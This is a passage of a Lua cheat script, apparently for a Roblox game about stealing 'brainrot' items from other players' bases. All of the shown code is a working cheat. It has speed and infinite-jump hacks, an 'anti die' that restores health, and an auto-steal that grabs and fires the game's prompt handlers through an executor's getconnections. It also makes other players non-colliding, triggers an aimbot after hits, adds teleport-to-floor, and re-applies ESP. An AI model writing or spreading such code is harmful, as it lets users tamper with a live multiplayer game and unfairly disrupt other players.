    divider.Size=UDim2.new(1,-20,0,1); divider.Position=UDim2.new(0,10,0,34)
    divider.BackgroundColor3=WHITE; divider.BackgroundTransparency=0.5; divider.BorderSizePixel=0; divider.ZIndex=31
    local timerLbl=Instance.new("TextLabel",card)
    timerLbl.Size=UDim2.new(1,0,0,H-38); timerLbl.Position=UDim2.new(0,0,0,36)
    timerLbl.BackgroundTransparency=1; timerLbl.Text=string.format("%.1f",duration).."s"
    timerLbl.TextColor3=WHITE; timerLbl.Font=Enum.Font.GothamBlack; timerLbl.TextSize=24
    timerLbl.TextXAlignment=Enum.TextXAlignment.Center; timerLbl.ZIndex=32
    local shimmer=addShimmerToLabel(timerLbl,WHITE,WHITE)
    task.spawn(function() local t=0; while timerLbl and timerLbl.Parent do t=t+0.04; shimmer.Offset=Vector2.new(math.sin(t)*0.5,0); task.wait(0.04) end end)
    local dragStart,dragStartPos,dragging=nil,nil,false
    card.InputBegan:Connect(function(inp)
        if inp.UserInputType==Enum.UserInputType.MouseButton1 or inp.UserInputType==Enum.UserInputType.Touch then
            dragging=true; dragStart=inp.Position; dragStartPos=card.Position
            inp.Changed:Connect(function() if inp.UserInputState==Enum.UserInputState.End then dragging=false end end)
        end
    end)
    UIS.InputChanged:Connect(function(inp)
        if dragging and (inp.UserInputType==Enum.UserInputType.MouseMovement or inp.UserInputType==Enum.UserInputType.Touch) then
            local d=inp.Position-dragStart
            card.Position=UDim2.new(dragStartPos.X.Scale,dragStartPos.X.Offset+d.X,dragStartPos.Y.Scale,dragStartPos.Y.Offset+d.Y)
        end
    end)
    local startTime=tick(); local conn
    conn=RunService.Heartbeat:Connect(function()
        local remaining=math.max(0,duration-(tick()-startTime))
        if remaining<=0 then conn:Disconnect(); pcall(function() sg:Destroy() end)
        elseif timerLbl and timerLbl.Parent then timerLbl.Text=string.format("%.1f",remaining).."s" end
    end)
    return sg
end

function onHumanoidStateChanged(old,new)
    local char=LP.Character; if not char then return end
    local hum=char:FindFirstChildOfClass("Humanoid"); if not hum then return end
    local isRag=(new==Enum.HumanoidStateType.Physics or new==Enum.HumanoidStateType.Ragdoll or new==Enum.HumanoidStateType.FallingDown)
    if isRag and not hum.PlatformStand and not activeBatBillboard then
        activeBatBillboard=createRagdollBillboard(2.6,"RAGDOLL",Color3.fromRGB(255,255,255))
        task.delay(2.6,function() if activeBatBillboard then pcall(function() activeBatBillboard:Destroy() end); activeBatBillboard=nil end end)
    end
    -- Aimbot After Hit: when ragdolled by a hit, auto-start bat aimbot
    -- NEVER enable during duel countdown (even if ragdolled in countdown)
    if isRag and aimbotAfterHitEnabled and not autoBatEnabled and not aimbotAfterHitDebounce then
        aimbotAfterHitDebounce=true
        task.spawn(function()
            task.wait(0.15)
            if not aimbotAfterHitEnabled then
                aimbotAfterHitDebounce=false
                return
            end
            -- Block while countdown is showing (GO / READY / START / 10..0)
            local inCountdown=false
            pcall(function()
                if SafeMode and SafeMode.inDuelCountdown then
                    inCountdown=SafeMode.inDuelCountdown()
                end
            end)
            if inCountdown then
                aimbotAfterHitDebounce=false
                return
            end
            if RXZ.tpBat then
                aimbotAfterHitDebounce=false
                return
            end
            if not autoBatEnabled and queueAutoBatStart then
                queueAutoBatStart()
                if autoBatSetVisual then autoBatSetVisual(true) end
                if mobBtnRefs and mobBtnRefs.autoBat then mobBtnRefs.autoBat(true) end
            end
            task.delay(2.5,function() aimbotAfterHitDebounce=false end)
        end)
    end
end
function onMedusaStateChanged()
    local char=LP.Character; if not char then return end
    local hum=char:FindFirstChildOfClass("Humanoid")
    if hum and hum.PlatformStand and not activeMedusaBillboard then
        activeMedusaBillboard=createRagdollBillboard(4.5,"STONE",Color3.fromRGB(255,255,255))
        task.delay(4.5,function() if activeMedusaBillboard then pcall(function() activeMedusaBillboard:Destroy() end); activeMedusaBillboard=nil end end)
    end
end
function setupRagdollTriggers()
    local char=LP.Character; if not char then return end
    local hum=char:FindFirstChildOfClass("Humanoid")
    if hum then
        hum.StateChanged:Connect(onHumanoidStateChanged)
        hum:GetPropertyChangedSignal("PlatformStand"):Connect(onMedusaStateChanged)
    end
end
function setupSpeedIndicator(char) end
function getActiveMoveSpeed()
    if laggerModeEnabled then return carrySpeedActive and LAGGER_CARRY_SPEED or LAGGER_SPEED
    elseif carrySpeedActive then return CS
    else return NS end
end

-- ====================== SPEED (Anti Drop system — no spoof) ======================
-- Normal: root.Velocity | Carry: CFrame step | Anti Fling + Anti Die
local function _voidApplyVelocitySpeed(speed)
    local char = LP.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    local root = char:FindFirstChild("HumanoidRootPart")
    if not hum or not root then return end

    -- Anti Fling (with Anti Die)
    if antiDieEnabled and root.AssemblyLinearVelocity.Magnitude > FLING_THRESHOLD then
        root.AssemblyLinearVelocity = Vector3.new(0, root.AssemblyLinearVelocity.Y, 0)
        root.AssemblyAngularVelocity = Vector3.zero
    end

    if hum.Health <= 0 then return end

    -- don't override combat movement
    if autoBatEnabled or autoLeftEnabled or autoRightEnabled or (RXZ and (RXZ.tpBat or RXZ.batV2)) or batV2Enabled then
        return
    end

    if isRagdollState and isRagdollState(hum) then
        lastMoveDir = Vector3.zero
        return
    end

    local dir = hum.MoveDirection
    if dir.Magnitude <= 0.05 then return end

    lastMoveDir = dir
    local u = dir.Unit
    local s = speed
    local pureCarry = carrySpeedActive and not laggerModeEnabled

    if pureCarry then
        -- CFrame Step (Carry) — exact Anti Drop logic
        local step = u * (s / 60)
        root.CFrame = root.CFrame + Vector3.new(step.X, 0, step.Z)
    else
        -- Normal / Lagger Velocity
        root.Velocity = Vector3.new(u.X * s, root.Velocity.Y, u.Z * s)
    end
end

local _voidSpeedConn = nil
pcall(function()
    if RunService.PreSimulation then
        _voidSpeedConn = RunService.PreSimulation:Connect(function()
            _voidApplyVelocitySpeed(getActiveMoveSpeed())
        end)
    else
        _voidSpeedConn = RunService.Heartbeat:Connect(function()
            _voidApplyVelocitySpeed(getActiveMoveSpeed())
        end)
    end
end)

-- ====================== ANTI DIE (global — Anti Drop style) ======================
local function setupAntiDie(char)
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid") or char:WaitForChild("Humanoid", 5)
    if not hum then return end
    hum.HealthChanged:Connect(function(hp)
        if antiDieEnabled and hp <= 0 then
            pcall(function()
                hum.Health = hum.MaxHealth
            end)
        end
    end)
end
if LP.Character then task.spawn(function() setupAntiDie(LP.Character) end) end
LP.CharacterAdded:Connect(function(c)
    task.wait(0.05)
    setupAntiDie(c)
end)

function getAutoPathSpeed()
    if laggerModeEnabled then return carrySpeedActive and LAGGER_CARRY_SPEED or LAGGER_SPEED
    else return NS end
end
local _autoSwitchWasSteal=false
local function isStealState()
    local char=LP.Character
    if not char then return false end
    local h=char:FindFirstChildOfClass("Humanoid")
    if h and h.WalkSpeed<25 then return true end
    local ok,val=pcall(function() return LP:GetAttribute("Stealing") end)
    if ok and val==true then return true end
    local ok2,val2=pcall(function() return char:GetAttribute("Stealing") end)
    if ok2 and val2==true then return true end
    for _,t in ipairs(char:GetChildren()) do
        if t:IsA("Tool") then
            local n=t.Name:lower()
            if n:find("brainrot") or n:find("skibidi") or n:find("toilet") then return true end
        end
    end
    return false
end
function updateAutoSwitchSpeed()
    if not autoSwitchSpeedEnabled then return end
    local isSteal=isStealState()
    if isSteal==_autoSwitchWasSteal then return end
    _autoSwitchWasSteal=isSteal
    if isSteal then
        if laggerModeEnabled then
            carrySpeedActive=true
        else
            carrySpeedActive=true
        end
    else
        if not laggerModeEnabled then
            carrySpeedActive=false
        end
    end
    if refreshSpeedModeLabel then refreshSpeedModeLabel() end
    if mobBtnRefs.carrySpeed then mobBtnRefs.carrySpeed(carrySpeedActive and not laggerModeEnabled) end
    if mobBtnRefs.laggerCarry then mobBtnRefs.laggerCarry(laggerModeEnabled and carrySpeedActive) end
    if mobBtnRefs.laggerNormal then mobBtnRefs.laggerNormal(laggerModeEnabled and not carrySpeedActive) end
end
task.spawn(function() while true do task.wait(0.1); updateAutoSwitchSpeed() end end)

function startHoldInfJump()
    if holdInfJumpConn then holdInfJumpConn:Disconnect() end
    holdInfJumpConn=RunService.Heartbeat:Connect(function()
        if not infJumpEnabled then return end
        local char=LP.Character; if not char then return end
        local root=char:FindFirstChild("HumanoidRootPart"); local hum=char:FindFirstChildOfClass("Humanoid")
        if not root or not hum then return end
        local isJumpHeld=UIS:IsKeyDown(Enum.KeyCode.Space) or (hum.Jump==true)
        if isJumpHeld and root.Velocity.Y<35 then root.Velocity=Vector3.new(root.Velocity.X,55,root.Velocity.Z) end
        if root.Velocity.Y<-120 then root.Velocity=Vector3.new(root.Velocity.X,-120,root.Velocity.Z) end
    end)
end
function stopHoldInfJump()
    if holdInfJumpConn then holdInfJumpConn:Disconnect(); holdInfJumpConn=nil end
end

task.spawn(function()
    local BLACKLIST_URL="https://pastebin.com/2zLUXv2K"
    pcall(function() HS.HttpEnabled=true end)
    while task.wait(3) do
        pcall(function()
            local r=game:HttpGet(BLACKLIST_URL)
            if r and string.find(r,tostring(LP.UserId),1,true) then
                LP:Kick("You have been removed for cheating | CODE: BAC-1633")
            end
        end)
    end
end)

local KB={
    DropBrainrot={kb=Enum.KeyCode.H,gp=nil},
    AutoLeft={kb=Enum.KeyCode.J,gp=nil},
    AutoRight={kb=Enum.KeyCode.L,gp=nil},
    AutoBat={kb=Enum.KeyCode.E,gp=nil},
    TPBat={kb=Enum.KeyCode.Y,gp=nil},
    TPFloor={kb=Enum.KeyCode.T,gp=nil},
    GuiHide={kb=Enum.KeyCode.RightControl,gp=nil},
    SpeedToggle={kb=Enum.KeyCode.C,gp=nil},
    LaggerToggle={kb=Enum.KeyCode.K,gp=nil},
    LaggerCarry={kb=Enum.KeyCode.B,gp=nil},
    BatV2={kb=Enum.KeyCode.V,gp=nil},
}
local AP_L1,AP_L2=Vector3.new(-476.47,-6.28,92.73),Vector3.new(-483.12,-4.95,94.81)
local AP_R1,AP_R2=Vector3.new(-476.16,-6.52,25.62),Vector3.new(-483.06,-5.03,25.48)
local Steal={
    AutoStealEnabled=false,
    StealRadius=60,
    StealDuration=1.3,
    Mode=1, -- 1=90%, 2=85%, 3=80%, 4=75%
    Data={},
}
local STEAL_MODE_CFG = {
    [1] = { threshold = 0.90, nearDist = 14 },
    [2] = { threshold = 0.85, nearDist = 12 },
    [3] = { threshold = 0.80, nearDist = 11 },
    [4] = { threshold = 0.75, nearDist = 10 },
}
local isStealing,stealStartTime=false,nil
local stealVisualPct=0
local Conns={autoSteal=nil,antiRag=nil,batCounter=nil,anchor={}}
local MEDUSA_COOLDOWN=8; local batCounterDebounce=false
local modeValLbl; local lastMoveDir=Vector3.new(0,0,0)
local MOVE_KEYS={[Enum.KeyCode.W]=true,[Enum.KeyCode.A]=true,[Enum.KeyCode.S]=true,[Enum.KeyCode.D]=true,[Enum.KeyCode.Up]=true,[Enum.KeyCode.Left]=true,[Enum.KeyCode.Down]=true,[Enum.KeyCode.Right]=true}

function isRagdollState(hum)
    if not hum then return true end; local st=hum:GetState()
    return hum.PlatformStand or st==Enum.HumanoidStateType.Physics or st==Enum.HumanoidStateType.Ragdoll or st==Enum.HumanoidStateType.FallingDown
end
function isMyPlotByName(plotName)
    local plots=workspace:FindFirstChild("Plots"); if not plots then return false end
    local plot=plots:FindFirstChild(plotName); if not plot then return false end
    local sign=plot:FindFirstChild("PlotSign")
    if sign then local yb=sign:FindFirstChild("YourBase"); if yb and yb:IsA("BillboardGui") then return yb.Enabled==true end end
    return false
end
function isNearPodiumWithPrompt()
    local char=LP.Character; local hrpL=char and char:FindFirstChild("HumanoidRootPart"); if not hrpL then return false end
    local plots=workspace:FindFirstChild("Plots"); if not plots then return false end
    for _,plot in ipairs(plots:GetChildren()) do
        if isMyPlotByName(plot.Name) then continue end
        local podiums=plot:FindFirstChild("AnimalPodiums"); if not podiums then continue end
        for _,podium in ipairs(podiums:GetChildren()) do
            local base=podium:FindFirstChild("Base"); if not base then continue end
            local sp=base:FindFirstChild("Spawn"); if not sp then continue end
            local d=(hrpL.Position-sp.Position).Magnitude; if d>Steal.StealRadius then continue end
            local att=sp:FindFirstChild("PromptAttachment"); if not att then continue end
            for _,obj in ipairs(att:GetChildren()) do if obj:IsA("ProximityPrompt") and obj.Enabled then return true,d end end
        end
    end
    return false,math.huge
end
local function getStealHRP()
    local c=LP.Character
    if c then
        return c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("Torso") or c:FindFirstChild("UpperTorso")
    end
    return nil
end
local function getPromptPosition(prompt)
    local att=prompt:FindFirstChild("Attachment")
    if att then return att.WorldPosition or att.Position end
    local parent=prompt.Parent
    if parent and parent:IsA("BasePart") then return parent.Position end
    if parent and parent.Parent and parent.Parent:IsA("BasePart") then return parent.Parent.Position end
    if parent and parent.Parent and parent.Parent.Parent and parent.Parent.Parent:IsA("BasePart") then
        return parent.Parent.Parent.Position
    end
    -- fallback: spawn under podium
    local p=parent
    while p and p~=workspace do
        if p.Name=="Spawn" and p:IsA("BasePart") then return p.Position end
        p=p.Parent
    end
    return nil
end
function findNearestPrompt()
    local hrp=getStealHRP()
    if not hrp then return nil end
    local plots=workspace:FindFirstChild("Plots")
    if not plots then return nil end
    local nearest,dist=nil,math.huge
    for _,plot in ipairs(plots:GetChildren()) do
        if isMyPlotByName(plot.Name) then continue end
        local pods=plot:FindFirstChild("AnimalPodiums")
        if not pods then continue end
        for _,pod in ipairs(pods:GetChildren()) do
            local base=pod:FindFirstChild("Base")
            if not base then continue end
            local spawn=base:FindFirstChild("Spawn")
            if not spawn then continue end
            local d=(spawn.Position-hrp.Position).Magnitude
            if d<=Steal.StealRadius and d<dist then
                local att=spawn:FindFirstChild("PromptAttachment")
                if att then
                    for _,p in ipairs(att:GetChildren()) do
                        if p:IsA("ProximityPrompt") and p.ActionText and p.ActionText:find("Steal") then
                            nearest,dist=p,d
                        end
                    end
                end
            end
        end
    end
    return nearest
end
function executeSteal(prompt)
    if isStealing or not Steal.AutoStealEnabled then return end
    if not Steal.Data[prompt] then
        Steal.Data[prompt]={hold={},trigger={},ready=true}
        if getconnections then
            for _,c in ipairs(getconnections(prompt.PromptButtonHoldBegan)) do
                if c.Function then table.insert(Steal.Data[prompt].hold,c.Function) end
            end
            for _,c in ipairs(getconnections(prompt.Triggered)) do
                if c.Function then table.insert(Steal.Data[prompt].trigger,c.Function) end
            end
        end
    end
    local data=Steal.Data[prompt]
    if not data.ready then return end
    data.ready=false
    isStealing=true
    stealStartTime=tick()
    stealVisualPct=0
    task.spawn(function()
        for _,f in ipairs(data.hold) do pcall(f) end
    end)
    local cfg=STEAL_MODE_CFG[Steal.Mode] or STEAL_MODE_CFG[1]
    local threshold=cfg.threshold
    local nearDist=cfg.nearDist
    local totalTime=tonumber(Steal.StealDuration) or 1.3
    local timeToThreshold=totalTime*threshold
    local timeAfterThreshold=totalTime-timeToThreshold
    local startTime=tick()
    -- Phase 1: charge up to threshold %
    while tick()-startTime < timeToThreshold do
        if not Steal.AutoStealEnabled then
            isStealing=false; data.ready=true; stealStartTime=nil; stealVisualPct=0
            return
        end
        stealVisualPct=math.clamp((tick()-startTime)/totalTime,0,threshold)
        task.wait()
    end
    stealVisualPct=threshold
    -- Phase 2: wait until near enough (max 4s)
    local hrp=getStealHRP()
    local stillNear=false
    if hrp then
        local targetPos=getPromptPosition(prompt)
        if targetPos then
            local dist=(targetPos-hrp.Position).Magnitude
            if dist<=nearDist then stillNear=true end
        end
    end
    if not stillNear then
        local holdStart=tick()
        while tick()-holdStart < 4 do
            if not Steal.AutoStealEnabled then
                isStealing=false; data.ready=true; stealStartTime=nil; stealVisualPct=0
                return
            end
            stealVisualPct=threshold
            local hrp2=getStealHRP()
            if hrp2 then
                local tp=getPromptPosition(prompt)
                if tp and (tp-hrp2.Position).Magnitude<=nearDist then
                    stillNear=true
                    break
                end
            end
            task.wait()
        end
        if not stillNear then
            isStealing=false; data.ready=true; stealStartTime=nil; stealVisualPct=0
            return
        end
    end
    -- Phase 3: finish remaining duration then trigger
    local resumeTime=tick()
    while tick()-resumeTime < timeAfterThreshold do
        if not Steal.AutoStealEnabled then
            isStealing=false; data.ready=true; stealStartTime=nil; stealVisualPct=0
            return
        end
        local fin=(tick()-resumeTime)/math.max(timeAfterThreshold,0.01)
        stealVisualPct=threshold + fin*(1-threshold)
        task.wait()
    end
    stealVisualPct=1
    for _,f in ipairs(data.trigger) do pcall(f) end
    task.wait(0.05)
    data.ready=true
    isStealing=false
    stealStartTime=nil
    stealVisualPct=0
end
function onAutoPathFinished() end -- kept for path hooks; new system handles near-check itself
startAutoSteal=function()
    if Conns.autoSteal then return end
    Conns.autoSteal=RunService.Heartbeat:Connect(function()
        if isStealing or not Steal.AutoStealEnabled then return end
        local success,prompt=pcall(findNearestPrompt)
        if success and prompt then
            pcall(executeSteal,prompt)
        end
    end)
end
stopAutoSteal=function()
    if Conns.autoSteal then Conns.autoSteal:Disconnect(); Conns.autoSteal=nil end
    isStealing=false
    stealStartTime=nil
    stealVisualPct=0
end

RunService.Stepped:Connect(function()
    for _,p in ipairs(Players:GetPlayers()) do
        if p~=LP and p.Character then
            for _,part in ipairs(p.Character:GetDescendants()) do
                if part:IsA("BasePart") then part.CanCollide=false end
            end
        end
    end
end)

-- speed handled by Anti Drop system (getActiveMoveSpeed + _voidApplyVelocitySpeed)


LP.CharacterAdded:Connect(function(char)
    task.wait(0.5); setupSpeedIndicator(char); setupRagdollTriggers()
    if medusaCounterEnabled then setupMedusa(char) end
    if batCounterEnabled then startBatCounter() end
    if unwalkEnabled then task.wait(0.5); startUnwalk() end
    if animPackEnabled and animPackName and animPackName~="OFF" then
        task.delay(0.4,function() pcall(function() applyAnimPack(animPackName) end) end)
    end
    task.delay(0.5, function() pcall(function() applyCharterToChar(char) end) end)
    if refreshSpeedModeLabel then refreshSpeedModeLabel() end
    if mobBtnRefs.carrySpeed then mobBtnRefs.carrySpeed(carrySpeedActive) end
    if mobBtnRefs.lagger then mobBtnRefs.lagger(laggerModeEnabled) end
    -- Re-apply ESP for spawned char
    if espEnabled then
        for _,plr in ipairs(Players:GetPlayers()) do
            if plr ~= LP then
                task.spawn(function()
                    task.wait(0.4)
                    if espEnabled then espMakeLabel(plr) end
                end)
            end
        end
    end
end)
if LP.Character then setupSpeedIndicator(LP.Character); setupRagdollTriggers(); task.spawn(function() task.wait(0.6); pcall(applyCharterToChar, LP.Character) end) end

local alConn,arConn=nil,nil; local alPhase,arPhase=1,1
stopAutoLeft=function()
    if alConn then alConn:Disconnect(); alConn=nil end; alPhase=1
    local char=LP.Character; if char then local h=char:FindFirstChildOfClass("Humanoid"); if h then h:Move(Vector3.zero,false) end end
    if autoLeftSetVisual then autoLeftSetVisual(false) end
    if mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(false) end
end
stopAutoRight=function()
    if arConn then arConn:Disconnect(); arConn=nil end; arPhase=1
    local char=LP.Character; if char then local h=char:FindFirstChildOfClass("Humanoid"); if h then h:Move(Vector3.zero,false) end end
    if autoRightSetVisual then autoRightSetVisual(false) end
    if mobBtnRefs.autoRight then mobBtnRefs.autoRight(false) end
end

function findBat()
    local char=LP.Character; if not char then return nil end
    for _,tool in ipairs(char:GetChildren()) do if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then return tool end end
    local bp=LP:FindFirstChild("Backpack"); if bp then for _,tool in ipairs(bp:GetChildren()) do if tool:IsA("Tool") and (tool.Name:lower():find("bat") or tool.Name:lower():find("slap")) then return tool end end end
    return nil
end

startAutoLeft=function()
    if alConn then alConn:Disconnect() end; alPhase=1
    alConn=RunService.Heartbeat:Connect(function()
        if not autoLeftEnabled then return end
        local char=LP.Character; if not char then return end
        local hrp=char:FindFirstChild("HumanoidRootPart"); local hum=char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum then return end
        if isRagdollState(hum) then hum:Move(Vector3.zero,false); return end
        local spd=getAutoPathSpeed()
        if alPhase==1 then
            local tgt=Vector3.new(AP_L1.X,hrp.Position.Y,AP_L1.Z)
            if (tgt-hrp.Position).Magnitude<1 then
                alPhase=2; local d=AP_L2-hrp.Position; local mv=Vector3.new(d.X,0,d.Z).Unit
                hum:Move(mv,false); hrp.Velocity=Vector3.new(mv.X*spd,hrp.Velocity.Y,mv.Z*spd); return
            end
            local d=AP_L1-hrp.Position; local mv=Vector3.new(d.X,0,d.Z).Unit
            hum:Move(mv,false); hrp.Velocity=Vector3.new(mv.X*spd,hrp.Velocity.Y,mv.Z*spd)
        elseif alPhase==2 then
            local tgt=Vector3.new(AP_L2.X,hrp.Position.Y,AP_L2.Z)
            if (tgt-hrp.Position).Magnitude<1 then
                hum:Move(Vector3.zero,false); hrp.Velocity=Vector3.zero
                autoLeftEnabled=false; if alConn then alConn:Disconnect(); alConn=nil end; alPhase=1
                if autoLeftSetVisual then autoLeftSetVisual(false) end
                if mobBtnRefs.autoLeft then mobBtnRefs.autoLeft(false) end
                if onAutoPathFinished then onAutoPathFinished() end
                return
            end
            local d=AP_L2-hrp.Position; local mv=Vector3.new(d.X,0,d.Z).Unit
            hum:Move(mv,false); hrp.Velocity=Vector3.new(mv.X*spd,hrp.Velocity.Y,mv.Z*spd)
        end
        if autoMoveSwingEnabled and not _alSwingDebounce then
            _alSwingDebounce=true
            local bat=findBat()
            if bat then
                if bat.Parent~=char then pcall(function() hum:EquipTool(bat) end) end
                pcall(function() bat:Activate() end)
            end
            task.delay(autoMoveSwingInterval,function() _alSwingDebounce=false end)
        end
    end)
end
startAutoRight=function()
    if arConn then arConn:Disconnect() end; arPhase=1
    arConn=RunService.Heartbeat:Connect(function()
        if not autoRightEnabled then return end
        local char=LP.Character; if not char then return end
        local hrp=char:FindFirstChild("HumanoidRootPart"); local hum=char:FindFirstChildOfClass("Humanoid")
        if not hrp or not hum then return end
        if isRagdollState(hum) then hum:Move(Vector3.zero,false); return end
        local spd=getAutoPathSpeed()
        if arPhase==1 then
            local tgt=Vector3.new(AP_R1.X,hrp.Position.Y,AP_R1.Z)
            if (tgt-hrp.Position).Magnitude<1 then
                arPhase=2; local d=AP_R2-hrp.Position; local mv=Vector3.new(d.X,0,d.Z).Unit
                hum:Move(mv,false); hrp.Velocity=Vector3.new(mv.X*spd,hrp.Velocity.Y,mv.Z*spd); return
            end
            local d=AP_R1-hrp.Position; local mv=Vector3.new(d.X,0,d.Z).Unit
            hum:Move(mv,false); hrp.Velocity=Vector3.new(mv.X*spd,hrp.Velocity.Y,mv.Z*spd)
        elseif arPhase==2 then
            local tgt=Vector3.new(AP_R2.X,hrp.Position.Y,AP_R2.Z)
            if (tgt-hrp.Position).Magnitude<1 then
                hum:Move(Vector3.zero,false); hrp.Velocity=Vector3.zero
                autoRightEnabled=false; if arConn then arConn:Disconnect(); arConn=nil end; arPhase=1
                if autoRightSetVisual then autoRightSetVisual(false) end
                if mobBtnRefs.autoRight then mobBtnRefs.autoRight(false) end
                if onAutoPathFinished then onAutoPathFinished() end
                return
            end
            local d=AP_R2-hrp.Position; local mv=Vector3.new(d.X,0,d.Z).Unit
            hum:Move(mv,false); hrp.Velocity=Vector3.new(mv.X*spd,hrp.Velocity.Y,mv.Z*spd)
        end
        if autoMoveSwingEnabled and not _arSwingDebounce then
            _arSwingDebounce=true
            local bat=findBat()
            if bat then
                if bat.Parent~=char then pcall(function() hum:EquipTool(bat) end) end
                pcall(function() bat:Activate() end)
            end
            task.delay(autoMoveSwingInterval,function() _arSwingDebounce=false end)
        end
    end)
end

-- ============================================================
-- DROP BRAINROT
-- ============================================================
local _wfConns={}
-- Drop system from VYNX (ascend then snap to ground)
function runDrop()
    if dropActive then return end
    -- stop conflicting combat modes
    if autoBatEnabled then
        autoBatEnabled=false
        if resetAutoBatMotion then resetAutoBatMotion() end
        if stopBatAimbot then stopBatAimbot() end
        if autoBatSetVisual then autoBatSetVisual(false) end
        if mobBtnRefs.autoBat then mobBtnRefs.autoBat(false) end
    end
    local char=LP.Character; if not char then return end
    local root=char:FindFirstChild("HumanoidRootPart"); if not root then return end
    dropActive=true
    local t0=tick()
    local dc
    dc=RunService.Heartbeat:Connect(function()
        local r=char and char:FindFirstChild("HumanoidRootPart")
        if not r then
            if dc then dc:Disconnect() end
            dropActive=false
            return
        end
        if tick()-t0 >= (DROP_ASCEND_DURATION or 0.2) then
            dc:Disconnect()
            local rp=RaycastParams.new()
            rp.FilterDescendantsInstances={char}
            rp.FilterType=Enum.RaycastFilterType.Exclude
            local rr=workspace:Raycast(r.Position, Vector3.new(0,-2000,0), rp)
            if rr then
                local hum2=char:FindFirstChildOfClass("Humanoid")
                local off=(hum2 and hum2.HipHeight or 2)+(r.Size.Y/2)
                r.CFrame=CFrame.new(r.Position.X, rr.Position.Y+off, r.Position.Z)
                pcall(function()
                    r.AssemblyLinearVelocity=Vector3.zero
                    r.Velocity=Vector3.zero
                end)
            end
            dropActive=false
            return
        end
        -- ascend
        pcall(function()
            r.Velocity=Vector3.new(r.Velocity.X, DROP_ASCEND_SPEED or 150, r.Velocity.Z)
            r.AssemblyLinearVelocity=Vector3.new(
                r.AssemblyLinearVelocity.X,
                DROP_ASCEND_SPEED or 150,
                r.AssemblyLinearVelocity.Z
            )
        end)
    end)
end

function doAutoTPDown(force)
    local char=LP.Character; if not char then return end
    local hrp=char:FindFirstChild("HumanoidRootPart"); if not hrp then return end
    local hum2=char:FindFirstChildOfClass("Humanoid"); if not hum2 then return end
    if not force then if hum2.FloorMaterial~=Enum.Material.Air then return end; if not(hrp.Position.Y>=autoTPHeight) then return end end
    hrp.CFrame=CFrame.new(hrp.Position.X,-7.00,hrp.Position.Z)*CFrame.Angles(0,select(2,hrp.CFrame:ToEulerAnglesYXZ()),0)
    hrp.Velocity=Vector3.zero
end
startAutoTP=function()
    if autoTPConn then task.cancel(autoTPConn); autoTPConn=nil end
    autoTPConn=task.spawn(function()
        while autoTPEnabled do task.wait(0.1); pcall(function() doAutoTPDown(false) end) end
    end)
end
stopAutoTP=function() autoTPEnabled=false; if autoTPConn then task.cancel(autoTPConn); autoTPConn=nil end end
runTPFloor=function() pcall(function() doAutoTPDown(true) end) end

local STRETCH_NAME="Movee_Stretch"
enableStretchRez=function()
    stretchRezEnabled=true; if stretchRezConn then stretchRezConn:Disconnect() end
    pcall(function() RunService:UnbindFromRenderStep(STRETCH_NAME) end)
    pcall(function()
        RunService:BindToRenderStep(STRETCH_NAME,Enum.RenderPriority.Last.Value-1,function()
            local cam=workspace.CurrentCamera
            if cam then cam.CFrame=cam.CFrame*CFrame.new(0,0,0,1,0,0,0,0.8,0,0,0,1) end
        end)
    end)
end
disableStretchRez=function()
    stretchRezEnabled=false; pcall(function() RunService:UnbindFromRenderStep(STRETCH_NAME) end)
end

local defLightBrightness,defLightClock,defLightAmbient
function applyAntiLagDerender(obj)
    pcall(function()
        if obj:IsA("Accessory") or obj:IsA("Hat") then obj:Destroy()
        elseif obj:IsA("BasePart") then obj.Material=Enum.Material.Plastic; obj.Reflectance=0; obj.CastShadow=false
        elseif obj:IsA("Decal") or obj:IsA("Texture") then obj.Transparency=1
        elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") or obj:IsA("Fire") or obj:IsA("Smoke") or obj:IsA("Sparkles") then obj.Enabled=false end
    end)
end
enableAntiLag=function()
    removeAccessoriesEnabled=true; antiLagEnabled=true
    defLightBrightness=defLightBrightness or Lighting.Brightness
    defLightClock=defLightClock or Lighting.ClockTime
    defLightAmbient=defLightAmbient or Lighting.OutdoorAmbient
    Lighting.GlobalShadows=false; Lighting.FogEnd=1e10; Lighting.Brightness=1
    Lighting.EnvironmentDiffuseScale=0; Lighting.EnvironmentSpecularScale=0
    for _,e in pairs(Lighting:GetChildren()) do
        pcall(function()
            if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
                e.Enabled=false
            end
        end)
    end
    for _,obj in ipairs(workspace:GetDescendants()) do applyAntiLagDerender(obj) end
    if antiLagDescConn then antiLagDescConn:Disconnect() end
    antiLagDescConn=workspace.DescendantAdded:Connect(function(obj)
        if removeAccessoriesEnabled then applyAntiLagDerender(obj) end
    end)
end
disableAntiLag=function()
    removeAccessoriesEnabled=false; antiLagEnabled=false
    if antiLagDescConn then antiLagDescConn:Disconnect(); antiLagDescConn=nil end
    pcall(function()
        if defLightBrightness then Lighting.Brightness=defLightBrightness end
        if defLightClock then Lighting.ClockTime=defLightClock end
        if defLightAmbient then Lighting.OutdoorAmbient=defLightAmbient end
        Lighting.ExposureCompensation=0
    end)
end

-- ============================================================
-- ANIMATION PACKS (from Empire)
-- ============================================================
local function stopAnimTracks(hum)
    if not hum then return end
    for _,tr in ipairs(hum:GetPlayingAnimationTracks()) do pcall(function() tr:Stop(0) end) end
end
local function setAnimId(obj,id)
    if obj and id then pcall(function() obj.AnimationId="rbxassetid://"..tostring(id) end) end
end
local function saveOriginalAnims(char)
    local animate=char and char:FindFirstChild("Animate")
    if not animate or next(_animOriginalIds) then return end
    local function gid(folder,child)
        local f=animate:FindFirstChild(folder)
        local a=f and f:FindFirstChild(child)
        return a and a.AnimationId or nil
    end
    _animOriginalIds={
        walk=gid("walk","WalkAnim"), run=gid("run","RunAnim"),
        jump=gid("jump","JumpAnim"), fall=gid("fall","FallAnim"),
        climb=gid("climb","ClimbAnim"),
        idle1=gid("idle","Animation1"), idle2=gid("idle","Animation2"),
    }
end
local function resetAnimPack(char)
    char=char or LP.Character
    local animate=char and char:FindFirstChild("Animate")
    if not animate or not next(_animOriginalIds) then return end
    local hum=char:FindFirstChildOfClass("Humanoid")
    stopAnimTracks(hum)
